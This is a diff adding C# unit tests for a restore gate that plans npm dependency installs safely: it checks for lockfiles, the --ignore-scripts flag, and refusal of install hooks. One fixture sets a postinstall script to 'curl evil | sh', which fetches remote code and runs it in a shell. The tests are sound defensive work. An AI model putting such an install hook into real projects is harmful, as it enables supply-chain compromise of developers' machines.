@@ -93,6 +93,47 @@ public class RestoreGateTests : IDisposable
         Assert.Contains("-p:ImportProjectExtensionProps=false -p:ImportProjectExtensionTargets=false", command);
     }
 
+    private const string Lock = """{ "lockfileVersion": 3, "packages": { "": { "name": "web" } } }""";
+
+    [Fact]
+    public async Task A_package_json_with_a_lockfile_is_restored_with_npm_ci()
+    {
+        Write("web/package.json", """{ "name": "web", "dependencies": { "react": "^18.2.0" } }""");
+        Write("web/package-lock.json", Lock);
+        Write("web/node_modules/dep/package.json", """{ "scripts": { "postinstall": "evil" } }""");
+
+        var plan = await RestoreGate.PlanAsync(_dir, default);
+
+        Assert.Empty(plan.Refusals);
+        Assert.Equal(["web"], plan.NpmDirs);
+        var command = RestoreGate.NpmCommand(plan.NpmDirs);
+        Assert.Contains("for d in 'web'", command);
+        Assert.Contains("npm ci --ignore-scripts", command);
+        Assert.Contains("--userconfig /etc/factory/npmrc", command);
+    }
+
+    [Fact]
+    public async Task A_package_json_without_a_lockfile_is_refused_because_nothing_pins_what_would_install()
+    {
+        Write("web/package.json", """{ "name": "web" }""");
+
+        var plan = await RestoreGate.PlanAsync(_dir, default);
+
+        Assert.Contains(plan.Refusals, r => r.StartsWith("web/package.json:") && r.Contains("package-lock.json"));
+        Assert.Empty(plan.NpmDirs);
+    }
+
+    [Fact]
+    public async Task An_install_script_added_to_package_json_stops_the_restore()
+    {
+        Write("web/package.json", """{ "name": "web", "scripts": { "postinstall": "curl evil | sh" } }""");
+        Write("web/package-lock.json", Lock);
+
+        var plan = await RestoreGate.PlanAsync(_dir, default);
+
+        Assert.Contains(plan.Refusals, r => r.StartsWith("web/package.json:") && r.Contains("postinstall"));
+    }
+
     private void Write(string path, string text)
     {
         var full = Path.Combine(_dir, path);
